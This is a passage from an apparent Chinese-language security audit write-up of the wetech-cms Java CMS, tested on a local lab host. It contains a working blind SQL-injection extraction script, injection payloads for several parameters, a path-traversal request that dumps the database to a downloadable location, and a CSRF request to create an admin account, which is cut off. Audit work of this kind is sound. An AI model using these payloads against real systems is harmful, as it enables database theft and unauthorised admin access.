&#x27;</span></span><br></pre></td></tr></table></figure><p>​发现该payload与第47行-search-TopicByKeyword的SQL注入payload相同，所以我们直接将之前所给脚本进行修改即可，于是我们有如下python脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url=<span class="string">&quot;http://172.21.55.165:8888/search/1&quot;</span></span><br><span class="line">url1=url+<span class="string">&quot;&#x27; or keyword like (case when ascii(substr(database(),1,1))=10 then &#x27;a&#x27; else &#x27;&#x27; end) and keyword like &#x27;&quot;</span><span class="comment">#前十个字符串的10位false包</span></span><br><span class="line">url2=url+<span class="string">&quot;&#x27; or keyword like (case when ascii(substr(database(),1,1))=100 then &#x27;a&#x27; else &#x27;&#x27; end) and keyword like &#x27;&quot;</span><span class="comment">#前十个字符串的100位false包</span></span><br><span class="line">url1_1=url+<span class="string">&quot;&#x27; or keyword like (case when ascii(substr(database(),10,1))=10 then &#x27;a&#x27; else &#x27;&#x27; end) and keyword like &#x27;&quot;</span><span class="comment">#前一百个字符串的10位false包</span></span><br><span class="line">url2_1=url+<span class="string">&quot;&#x27; or keyword like (case when ascii(substr(database(),10,1))=100 then &#x27;a&#x27; else &#x27;&#x27; end) and keyword like &#x27;&quot;</span><span class="comment">#前一百个字符串的100位false包</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">req</span>():</span><br><span class="line">    req1 = requests.get(url1)<span class="comment">#获取前十个字符串的100位false包</span></span><br><span class="line">    req2 = requests.get(url2)<span class="comment">#获取前十个字符串的100位false包</span></span><br><span class="line">    req1_1 = requests.get(url1_1)<span class="comment">#获取前一百个字符串的10位false包</span></span><br><span class="line">    req2_1 = requests.get(url2_1)<span class="comment">#获取前一百个字符串的100位false包</span></span><br><span class="line">    r_len1 = <span class="built_in">len</span>(req1.text)</span><br><span class="line">    r_len2 = <span class="built_in">len</span>(req2.text)</span><br><span class="line">    r_len1_1 = <span class="built_in">len</span>(req1_1.text)</span><br><span class="line">    r_len2_1 = <span class="built_in">len</span>(req2_1.text)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">12</span>):</span><br><span class="line">        <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>,<span class="number">127</span>):</span><br><span class="line">            payload=<span class="string">&quot;&#x27; or keyword like (case when ascii(substr(database(),&#123;i&#125;,1))=&#123;k&#125; then &#x27;a&#x27; else &#x27;&#x27; end) and keyword like &#x27;&quot;</span>.<span class="built_in">format</span>(i=i,k=k)<span class="comment">#SQL注入payload</span></span><br><span class="line">            th_url = url + payload</span><br><span class="line">            second = requests.get(th_url)</span><br><span class="line">            s_len = <span class="built_in">len</span>(second.text)</span><br><span class="line">            <span class="keyword">if</span> k &lt; <span class="number">100</span>:</span><br><span class="line">                <span class="keyword">if</span> i &lt; <span class="number">10</span>:</span><br><span class="line">                    <span class="keyword">if</span> s_len != r_len1:</span><br><span class="line">                        <span class="built_in">print</span>(<span class="built_in">chr</span>(k), end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">                        <span class="keyword">break</span></span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    <span class="keyword">if</span> s_len != r_len1_1:</span><br><span class="line">                        <span class="built_in">print</span>(<span class="built_in">chr</span>(k), end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">                        <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">if</span> i &lt; <span class="number">10</span>:</span><br><span class="line">                    <span class="keyword">if</span> s_len != r_len2:</span><br><span class="line">                        <span class="built_in">print</span>(<span class="built_in">chr</span>(k), end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">                        <span class="keyword">break</span></span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    <span class="keyword">if</span> s_len != r_len2_1:</span><br><span class="line">                        <span class="built_in">print</span>(<span class="built_in">chr</span>(k), end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">                        <span class="keyword">break</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    req()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><p>​成功获取库名：</p><p><img src="/img/wetech-cms/image-20241127150723049-1732721891177-7-1732797677431-4.png" alt="image-20241127150723049"></p><h4 id="src-main-java-tech-wetech-cms-dao-UserDao-java-成功"><a href="#src-main-java-tech-wetech-cms-dao-UserDao-java-成功" class="headerlink" title="src&#x2F;main&#x2F;java&#x2F;tech&#x2F;wetech&#x2F;cms&#x2F;dao&#x2F;UserDao.java(成功)"></a>src&#x2F;main&#x2F;java&#x2F;tech&#x2F;wetech&#x2F;cms&#x2F;dao&#x2F;UserDao.java(成功)</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> Pager&lt;User&gt; <span class="title function_">findUser</span><span class="params">(String gId, String rId, String searchCode, String searchValue)</span> &#123;</span><br><span class="line"><span class="type">String</span> <span class="variable">hql</span> <span class="operator">=</span> <span class="string">&quot;from User u where 1=1&quot;</span>;</span><br><span class="line"><span class="keyword">if</span> (StringUtils.isNotBlank(searchCode) &amp;&amp; StringUtils.isNotBlank(searchValue)) &#123;</span><br><span class="line"><span class="keyword">if</span> (<span class="string">&quot;id&quot;</span>.equals(searchCode)) &#123;</span><br><span class="line">hql += <span class="string">&quot; and u.id like &#x27;%&quot;</span> + searchValue + <span class="string">&quot;%&#x27;&quot;</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="string">&quot;username&quot;</span>.equals(searchCode)) &#123;</span><br><span class="line">hql += <span class="string">&quot; and u.username like &#x27;%&quot;</span> + searchValue + <span class="string">&quot;%&#x27;&quot;</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="string">&quot;nickname&quot;</span>.equals(searchCode)) &#123;</span><br><span class="line">hql += <span class="string">&quot; and u.nickname like &#x27;%&quot;</span> + searchValue + <span class="string">&quot;%&#x27;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (gId != <span class="literal">null</span> &amp;&amp; !<span class="string">&quot;&quot;</span>.equals(gId)) &#123;</span><br><span class="line">hql += <span class="string">&quot;and u.id in (select ug.user.id from UserGroup ug where ug.group.id=&quot;</span> + gId + <span class="string">&quot;)&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (rId != <span class="literal">null</span> &amp;&amp; !<span class="string">&quot;&quot;</span>.equals(rId)) &#123;</span><br><span class="line">hql += <span class="string">&quot;and u.id in (select ur.user.id from UserRole ur where ur.role.id=&quot;</span> + rId + <span class="string">&quot;)&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="built_in">this</span>.find(hql);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​分析代码我发现，该处存在多个参数存在动态拼接。向下追溯后find方法，未发现任何过滤，所以我们，直接向上追溯</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@ResponseBody</span></span><br><span class="line"><span class="meta">@RequestMapping(&quot;/list&quot;)</span></span><br><span class="line"><span class="keyword">public</span> Map&lt;String, Object&gt; <span class="title function_">list</span><span class="params">(HttpServletRequest req)</span> &#123;</span><br><span class="line"><span class="type">String</span> <span class="variable">gId</span> <span class="operator">=</span> req.getParameter(<span class="string">&quot;gId&quot;</span>);</span><br><span class="line"><span class="type">String</span> <span class="variable">rId</span> <span class="operator">=</span> req.getParameter(<span class="string">&quot;rId&quot;</span>);</span><br><span class="line"><span class="type">String</span> <span class="variable">searchCode</span> <span class="operator">=</span> req.getParameter(<span class="string">&quot;searchCode&quot;</span>);</span><br><span class="line"><span class="type">String</span> <span class="variable">searchValue</span> <span class="operator">=</span> req.getParameter(<span class="string">&quot;searchValue&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> DataTableMap.getMapData(userService.findUser(gId,rId,searchCode, searchValue));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​仅发现这一个路由调用了该方法。从SQL语句中我们可知，有三个变量使用了动态拼接，分别是：searchValue、gId和rId</p><p>​我们前往前端定位功能点。发现这是管理员后台的用户管理功能。那么我们开始测试：</p><h6 id="searchValue"><a href="#searchValue" class="headerlink" title="searchValue"></a>searchValue</h6><p>​根据功能点我们来到用户管理的搜索功能，尝试搜索后抓包，抓得如下数据包：</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/admin/user/list.do?draw=2&amp;columns%5B0%5D%5Bdata%5D=id&amp;columns%5B0%5D%5Bname%5D=&amp;columns%5B0%5D%5Bsearchable%5D=true&amp;columns%5B0%5D%5Borderable%5D=false&amp;columns%5B0%5D%5Bsearch%5D%5Bvalue%5D=&amp;columns%5B0%5D%5Bsearch%5D%5Bregex%5D=false&amp;columns%5B1%5D%5Bdata%5D=id&amp;columns%5B1%5D%5Bname%5D=&amp;columns%5B1%5D%5Bsearchable%5D=true&amp;columns%5B1%5D%5Borderable%5D=false&amp;columns%5B1%5D%5Bsearch%5D%5Bvalue%5D=&amp;columns%5B1%5D%5Bsearch%5D%5Bregex%5D=false&amp;columns%5B2%5D%5Bdata%5D=username&amp;columns%5B2%5D%5Bname%5D=&amp;columns%5B2%5D%5Bsearchable%5D=true&amp;columns%5B2%5D%5Borderable%5D=false&amp;columns%5B2%5D%5Bsearch%5D%5Bvalue%5D=&amp;columns%5B2%5D%5Bsearch%5D%5Bregex%5D=false&amp;columns%5B3%5D%5Bdata%5D=nickname&amp;columns%5B3%5D%5Bname%5D=&amp;columns%5B3%5D%5Bsearchable%5D=true&amp;columns%5B3%5D%5Borderable%5D=false&amp;columns%5B3%5D%5Bsearch%5D%5Bvalue%5D=&amp;columns%5B3%5D%5Bsearch%5D%5Bregex%5D=false&amp;columns%5B4%5D%5Bdata%5D=status&amp;columns%5B4%5D%5Bname%5D=&amp;columns%5B4%5D%5Bsearchable%5D=true&amp;columns%5B4%5D%5Borderable%5D=false&amp;columns%5B4%5D%5Bsearch%5D%5Bvalue%5D=&amp;columns%5B4%5D%5Bsearch%5D%5Bregex%5D=false&amp;columns%5B5%5D%5Bdata%5D=email&amp;columns%5B5%5D%5Bname%5D=&amp;columns%5B5%5D%5Bsearchable%5D=true&amp;columns%5B5%5D%5Borderable%5D=false&amp;columns%5B5%5D%5Bsearch%5D%5Bvalue%5D=&amp;columns%5B5%5D%5Bsearch%5D%5Bregex%5D=false&amp;columns%5B6%5D%5Bdata%5D=phone&amp;columns%5B6%5D%5Bname%5D=&amp;columns%5B6%5D%5Bsearchable%5D=true&amp;columns%5B6%5D%5Borderable%5D=false&amp;columns%5B6%5D%5Bsearch%5D%5Bvalue%5D=&amp;columns%5B6%5D%5Bsearch%5D%5Bregex%5D=false&amp;columns%5B7%5D%5Bdata%5D=createDate&amp;columns%5B7%5D%5Bname%5D=&amp;columns%5B7%5D%5Bsearchable%5D=true&amp;columns%5B7%5D%5Borderable%5D=false&amp;columns%5B7%5D%5Bsearch%5D%5Bvalue%5D=&amp;columns%5B7%5D%5Bsearch%5D%5Bregex%5D=false&amp;start=0&amp;length=15&amp;search%5Bvalue%5D=&amp;search%5Bregex%5D=false&amp;searchCode=id&amp;searchValue=&amp;_=1732691822696</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>172.21.55.165:8888</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36 Edg/131.0.0.0</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>application/json, text/javascript, */*; q=0.01</span><br><span class="line"><span class="attribute">X-Requested-With</span><span class="punctuation">: </span>XMLHttpRequest</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>http://172.21.55.165:8888/admin</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>JSESSIONID=5EA494FF429C210478C61A1E2BA26079; collapase-nav=collapse-nav</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br></pre></td></tr></table></figure><p>​GET参数中的searchValue则是可尝试的注入点：</p><p>​尝试输入单引号，报错，尝试够高SQL语句，得到payload：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27; and id like (case when ascii(substr(database(),1,1))=1 then &#x27;</span><span class="number">1</span><span class="string">&#x27; else &#x27;</span><span class="operator">%</span><span class="string">&#x27; end) and id like &#x27;</span></span><br></pre></td></tr></table></figure><p>​注入方式与前面的SQL注入方式相同，不做赘述。</p><h6 id="gId、rId"><a href="#gId、rId" class="headerlink" title="gId、rId"></a>gId、rId</h6><p>​在GET传参中加上一个gId或者rId即可，payload如下：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">2</span> <span class="keyword">and</span> id <span class="keyword">like</span> (<span class="keyword">case</span> <span class="keyword">when</span> ascii(substr(database(),<span class="number">1</span>,<span class="number">1</span>))<span class="operator">&gt;</span><span class="number">1</span> <span class="keyword">then</span> <span class="string">&#x27;1&#x27;</span> <span class="keyword">else</span> <span class="string">&#x27;%&#x27;</span> <span class="keyword">end</span>)</span><br></pre></td></tr></table></figure><h3 id="任意文件操控（读取，修改等）"><a href="#任意文件操控（读取，修改等）" class="headerlink" title="任意文件操控（读取，修改等）"></a>任意文件操控（读取，修改等）</h3><h4 id="src-main-java-tech-wetech-cms-controller-TopicController-java-失败"><a href="#src-main-java-tech-wetech-cms-controller-TopicController-java-失败" class="headerlink" title="src&#x2F;main&#x2F;java&#x2F;tech&#x2F;wetech&#x2F;cms&#x2F;controller&#x2F;TopicController.java(失败)"></a>src&#x2F;main&#x2F;java&#x2F;tech&#x2F;wetech&#x2F;cms&#x2F;controller&#x2F;TopicController.java(失败)</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@ResponseBody</span></span><br><span class="line"><span class="meta">@RequestMapping(value = &quot;/indexPic/add&quot;, method = RequestMethod.POST)</span></span><br><span class="line"><span class="keyword">public</span> ResponseData <span class="title function_">add</span><span class="params">(<span class="meta">@Validated</span> IndexPic indexPic, HttpSession session, BindingResult br, MultipartFile image)</span> &#123;</span><br><span class="line"><span class="keyword">if</span> (br.hasFieldErrors()) &#123;</span><br><span class="line"><span class="keyword">return</span> ResponseData.FAILED_NO_DATA;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 处理图片流数据</span></span><br><span class="line"><span class="type">String</span> <span class="variable">realPath</span> <span class="operator">=</span> session.getServletContext().getRealPath(<span class="string">&quot;&quot;</span>);</span><br><span class="line"><span class="type">String</span> <span class="variable">oldName</span> <span class="operator">=</span> image.getOriginalFilename();</span><br><span class="line"><span class="type">String</span> <span class="variable">newName</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Date</span>().getTime() + <span class="string">&quot;.&quot;</span> + FilenameUtils.getExtension(oldName);</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line"><span class="comment">// 对图片流进行压缩，生成文件和缩略图保存到指定文件夹</span></span><br><span class="line">writeIndexPic(realPath, newName, image.getInputStream());</span><br><span class="line">&#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">e.printStackTrace();</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">ResponseData</span>(<span class="literal">false</span>, e.getMessage());</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">indexPic.setOldName(oldName);</span><br><span class="line">indexPic.setNewName(newName);</span><br><span class="line">indexPicService.add(indexPic);</span><br><span class="line"><span class="keyword">if</span> (indexPic.getStatus() != <span class="number">0</span>) &#123;</span><br><span class="line">indexService.generateBody();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> ResponseData.SUCCESS_NO_DATA;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​经过审计，该功能点并没有进行过滤，因此理论上该功能点存在任意文件上传漏洞，且该项目解析JSP，可以Getshell，但是测试时发现由于项目过于老旧，一旦进行抓包getInputStream方法就会报错，于是放弃测试该功能点。</p><p>​edit功能点也是同样的原因</p><h3 id="目录穿透"><a href="#目录穿透" class="headerlink" title="目录穿透"></a>目录穿透</h3><h4 id="src-main-java-tech-wetech-basic-util-MySQLUtil-java-成功"><a href="#src-main-java-tech-wetech-basic-util-MySQLUtil-java-成功" class="headerlink" title="src&#x2F;main&#x2F;java&#x2F;tech&#x2F;wetech&#x2F;basic&#x2F;util&#x2F;MySQLUtil.java(成功)"></a>src&#x2F;main&#x2F;java&#x2F;tech&#x2F;wetech&#x2F;basic&#x2F;util&#x2F;MySQLUtil.java(成功)</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">backup</span><span class="params">()</span> &#123;</span><br><span class="line"><span class="type">BufferedReader</span> <span class="variable">br</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line"><span class="type">BufferedWriter</span> <span class="variable">bw</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line"><span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> <span class="string">&quot;cmd /c mysqldump -u&quot;</span>+username+<span class="string">&quot; -p&quot;</span>+password+<span class="string">&quot; &quot;</span>+database;</span><br><span class="line"><span class="type">Process</span> <span class="variable">proc</span> <span class="operator">=</span> Runtime.getRuntime().exec(cmd);</span><br><span class="line">br = <span class="keyword">new</span> <span class="title class_">BufferedReader</span>(<span class="keyword">new</span> <span class="title class_">InputStreamReader</span>(proc.getInputStream()));</span><br><span class="line">bw = <span class="keyword">new</span> <span class="title class_">BufferedWriter</span>(</span><br><span class="line"><span class="keyword">new</span> <span class="title class_">FileWriter</span>(backupDir+File.separator+filename+<span class="string">&quot;.sql&quot;</span>));</span><br><span class="line">System.out.println(backupDir+File.separator+filename);</span><br><span class="line"><span class="type">String</span> <span class="variable">str</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">while</span>((str=br.readLine())!=<span class="literal">null</span>) &#123;</span><br><span class="line">bw.write(str);</span><br><span class="line">bw.newLine();</span><br><span class="line">&#125;</span><br><span class="line">&#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">e.printStackTrace();</span><br><span class="line">&#125; <span class="keyword">finally</span> &#123;</span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line"><span class="keyword">if</span>(br!=<span class="literal">null</span>) br.close();</span><br><span class="line">&#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">e.printStackTrace();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line"><span class="keyword">if</span>(bw!=<span class="literal">null</span>) bw.close();</span><br><span class="line">&#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">e.printStackTrace();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​在寻找命令执行漏洞的过程中我发现，该功能再创建压缩包时存在目录穿透漏洞，我们向上追溯时发现，对于传入的参数filename并没有进行过滤，所以可以在任意位置创建一个压缩包文件，甚至可以传到upload文件夹下通过URL访问直接下载下来，实现脱库。</p><p>​payload如下：</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/admin/backup/add.do</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>172.21.55.165:8888</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>38</span><br><span class="line"><span class="attribute">X-Requested-With</span><span class="punctuation">: </span>XMLHttpRequest</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36 Edg/131.0.0.0</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>application/json, text/javascript, */*; q=0.01</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded; charset=UTF-8</span><br><span class="line"><span class="attribute">Origin</span><span class="punctuation">: </span>http://172.21.55.165:8888</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>http://172.21.55.165:8888/admin</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>cto_bundle=hVSq4l9ZUGQ2dzF1TiUyQmYlMkJhTUZKMXA1U3lTZTdnbWhmdlVhT3U1eGNIZXAlMkJyNDA1Qm83NUd5bVM1bXRONGdXMng1NVNYRHdrZXhQNmtWVk9uU0tNVnJYMjglMkJaQWFTdDRGdGRMck1DNkVvWEUyUVh5MWQlMkZvZkZ3YURyd1pnZjhvbWYlMkJMNHpWUmVCczZPc1lEeFNrMnRMYWxqSXclM0QlM0Q; collapase-nav=collapse-nav2; JSESSIONID=382FCF7BF762009C987ED7A0D73AF0C0</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"></span><br><span class="line"><span class="language-abnf"><span class="attribute">name</span><span class="operator">=</span>../../../indexPic/hadagaga123</span></span><br></pre></td></tr></table></figure><p>​我们访问<a href="http://localhost:8888/resources/indexPic/hadagaga123.tar.gz">http://localhost:8888/resources/indexPic/hadagaga123.tar.gz</a></p><p><img src="/img/wetech-cms/image-20241127231733666-1732721891177-8-1732797677430-2.png" alt="image-20241127231733666"></p><h2 id="前端渗透测试"><a href="#前端渗透测试" class="headerlink" title="前端渗透测试"></a>前端渗透测试</h2><h3 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h3><p>​经过测试该项目也是多处存在XSS，但多为POST型，难以利用。</p><h3 id="CSRF"><a href="#CSRF" class="headerlink" title="CSRF"></a>CSRF</h3><p>​我们先构建一个创建超级管理员用户的数据包：</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/admin/user/add.do</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>172.21.55.165:8888</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>136</span><br><span class="line"><span class="attribute">X-Requested-With</span><span class="punctuation">: </span>XMLHttpRequest</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36 Edg/131.0.0.0</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>application/json, text/javascript, */*; q=0.01</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded; charset=UTF-8</span><br><span class="line"><span class="attribute">Origin</span><span class="punctuation">: </span>http://172.21.55.165:8888</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>http://172.21.55.165:8888/admin</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>cto_bundle=hVSq4l9ZUGQ2dzF1TiUyQmYlMkJhTUZKMXA1U3lTZTdnbWhmdlVhT3U1eGNIZXAlMkJyNDA1Qm83NUd5bVM1bXRONGdXMng1NVNYRHdrZXhQNmtWVk9uU0tNVnJYMjglMkJaQWFTdDRGdGRMck1DNkVvWEUyUVh5MWQlMkZvZkZ3YURyd1pnZjhvbWYlMkJMNHpWUmVCczZPc1lEeFNrMnRMYWxqSXclM0QlM0Q; JSESSIONID=2CE951E9C69D2B0E5387EA588A046AC3; collapase-nav=collapse-nav</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"></span><br><span class="line"><span class="language-dts"><span class="attr">username</span><span class="operator">=</span>CSRF<span class="variable">&amp;nickname</span>=CSRF<span class="variable">&amp;password</span>=testtest<span class="variable">&amp;</span>confirmP<span class="attr">wd</span><span class="operator">=</span>testtest<span class="variable">&amp;phone</span>=<span class="number">12312312323</span><span class="variable">&amp;email</span>=<span class="number">1231241</span>%<span class="number">40</span>qq.com<span class="variable">&amp;status</span>=<span class="number">1</span><span class="variable">&amp;</span>roleI<span class="attr">ds</span><span class="operator">=</span><span class="number">1</span><span class="variable">&amp;</span>groupI<span class="attr">ds</span><span class="operator">=</span><span 